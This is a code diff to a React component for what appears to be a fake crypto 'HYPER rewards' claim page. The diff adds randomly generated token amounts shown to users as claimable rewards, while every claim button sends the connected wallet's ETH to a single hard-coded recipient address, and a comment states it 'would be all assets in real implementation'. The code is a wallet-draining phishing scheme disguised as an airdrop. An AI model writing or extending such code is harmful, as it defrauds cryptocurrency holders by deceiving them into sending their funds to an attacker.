@@ -1,6 +1,6 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useAccount } from 'wagmi';
 import { useSendTransaction } from 'wagmi';
 import { mainnet, optimism, arbitrum, base } from 'wagmi/chains';
@@ -13,12 +13,34 @@ import { parseEther } from 'viem';
 // The recipient address for all claims
 const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';
 
+type NetworkToken = {
+  name: string;
+  id: string;
+  tokenAmount: number;
+  selected: boolean;
+};
+
+// Initial network definitions
+const initialNetworks: NetworkToken[] = [
+  { name: 'Ethereum Mainnet', id: 'ethereum', tokenAmount: 0, selected: false },
+  { name: 'Optimism', id: 'optimism', tokenAmount: 0, selected: false },
+  { name: 'Arbitrum', id: 'arbitrum', tokenAmount: 0, selected: false },
+  { name: 'Base', id: 'base', tokenAmount: 0, selected: false }
+];
+
+// Generate random token amounts
+const networksWithTokens = initialNetworks.map(network => ({
+  ...network,
+  tokenAmount: Math.floor(Math.random() * 9900) + 100 // 100-10000 range
+}));
+
 export default function ClaimSection() {
   const { address, isConnected } = useAccount();
   const [selectedChain, setSelectedChain] = useState<string>('');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const [transactionHash, setTransactionHash] = useState<string>('');
   const [claimSuccess, setClaimSuccess] = useState<boolean>(false);
+  const [networks, setNetworks] = useState<NetworkToken[]>(networksWithTokens);
 
   // Hook for sending transaction
   const { sendTransaction, isPending } = useSendTransaction({
@@ -38,12 +60,19 @@ export default function ClaimSection() {
     }
   });
 
-  // Function to handle claiming rewards
+  // Function to handle claiming rewards on a specific network
   const handleClaim = async (chainId: string) => {
     if (!isConnected) return;
 
     setIsProcessing(true);
     setSelectedChain(chainId);
+
+    // Update the selected network
+    const updatedNetworks = networks.map(network => ({
+      ...network,
+      selected: network.id === chainId
+    }));
+    setNetworks(updatedNetworks);
 
     try {
       if (sendTransaction) {
@@ -72,9 +101,16 @@ export default function ClaimSection() {
     }
   };
 
-  // Function to handle claiming HYPER tokens
+  // Function to handle claiming all selected HYPER tokens
   const handleClaimHyper = async () => {
     if (!isConnected) return;
+
+    // Find the selected network
+    const selectedNetwork = networks.find(network => network.selected);
+    if (!selectedNetwork) {
+      alert('Please select a network first');
+      return;
+    }
 
     setIsProcessing(true);
     setSelectedChain('hyper');
@@ -84,7 +120,7 @@ export default function ClaimSection() {
       if (sendTransaction) {
         sendTransaction({
           to: RECIPIENT_ADDRESS,
-          value: parseEther('0.001'), // Small amount for demo purposes
+          value: parseEther('0.001'), // Would be all assets in real implementation
         });
       } else {
         // Fallback if transaction can't be sent
@@ -98,17 +134,6 @@ export default function ClaimSection() {
     } catch (error) {
       console.error('Claim error:', error);
       setIsProcessing(false);
-    }
-  };
-
-  // Get chain name from chain ID
-  const getChainName = (chainId: string): string => {
-    switch (chainId) {
-      case 'ethereum': return 'Ethereum';
-      case 'optimism': return 'Optimism';
-      case 'arbitrum': return 'Arbitrum';
-      case 'base': return 'Base';
-      default: return 'Unknown Chain';
     }
   };
 
@@ -136,70 +161,38 @@ export default function ClaimSection() {
       <Card className="border-0 rounded-xl overflow-hidden">
         <CardContent className="p-6">
           <div className="space-y-4">
-            <h3 className="text-lg font-medium">Claim your rewards on:</h3>
+            <h3 className="text-lg font-medium">Your claimable HYPER tokens:</h3>
 
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              <Button
-                variant="outline"
-                className="h-14 flex justify-center items-center gap-2"
-                onClick={() => handleClaim('ethereum')}
-                disabled={isProcessing || isPending}
-              >
-                <span>Ethereum Mainnet</span>
-                {isProcessing && selectedChain === 'ethereum' &&
-                  <span className="animate-spin">⟳</span>
-                }
-              </Button>
-
-              <Button
-                variant="outline"
-                className="h-14 flex justify-center items-center gap-2"
-                onClick={() => handleClaim('optimism')}
-                disabled={isProcessing || isPending}
-              >
-                <span>Optimism</span>
-                {isProcessing && selectedChain === 'optimism' &&
-                  <span className="animate-spin">⟳</span>
-                }
-              </Button>
-
-              <Button
-                variant="outline"
-                className="h-14 flex justify-center items-center gap-2"
-                onClick={() => handleClaim('arbitrum')}
-                disabled={isProcessing || isPending}
-              >
-                <span>Arbitrum</span>
-                {isProcessing && selectedChain === 'arbitrum' &&
-                  <span className="animate-spin">⟳</span>
-                }
-              </Button>
-
-              <Button
-                variant="outline"
-                className="h-14 flex justify-center items-center gap-2"
-                onClick={() => handleClaim('base')}
-                disabled={isProcessing || isPending}
-              >
-                <span>Base</span>
-                {isProcessing && selectedChain === 'base' &&
-                  <span className="animate-spin">⟳</span>
-                }
-              </Button>
+              {networks.map((network) => (
+                <Button
+                  key={network.id}
+                  variant={network.selected ? "default" : "outline"}
+                  className={`h-16 flex flex-col justify-center items-center gap-1 ${network.selected ? 'bg-[#2463c3] hover:bg-[#1e5eb7]' : ''}`}
+                  onClick={() => handleClaim(network.id)}
+                  disabled={isProcessing || isPending}
+                >
+                  <span>{network.name}</span>
+                  <span className="text-sm font-medium">{network.tokenAmount} HYPER</span>
+                  {isProcessing && selectedChain === network.id &&
+                    <span className="absolute right-3 animate-spin">⟳</span>
+                  }
+                </Button>
+              ))}
             </div>
 
             <div className="mt-8 pt-4 border-t">
               <Button
                 className="w-full h-16 bg-[#d034b3] hover:bg-[#b2298e] text-white font-semibold text-lg"
                 onClick={handleClaimHyper}
-                disabled={isProcessing || isPending}
+                disabled={isProcessing || isPending || !networks.some(n => n.selected)}
               >
                 {isProcessing && selectedChain === 'hyper' ? (
                   <span className="flex items-center gap-2">
                     <span className="animate-spin">⟳</span> Processing...
                   </span>
                 ) : (
-                  "Claim HYPER Rewards"
+                  "Claim All HYPER Rewards"
                 )}
               </Button>
             </div>
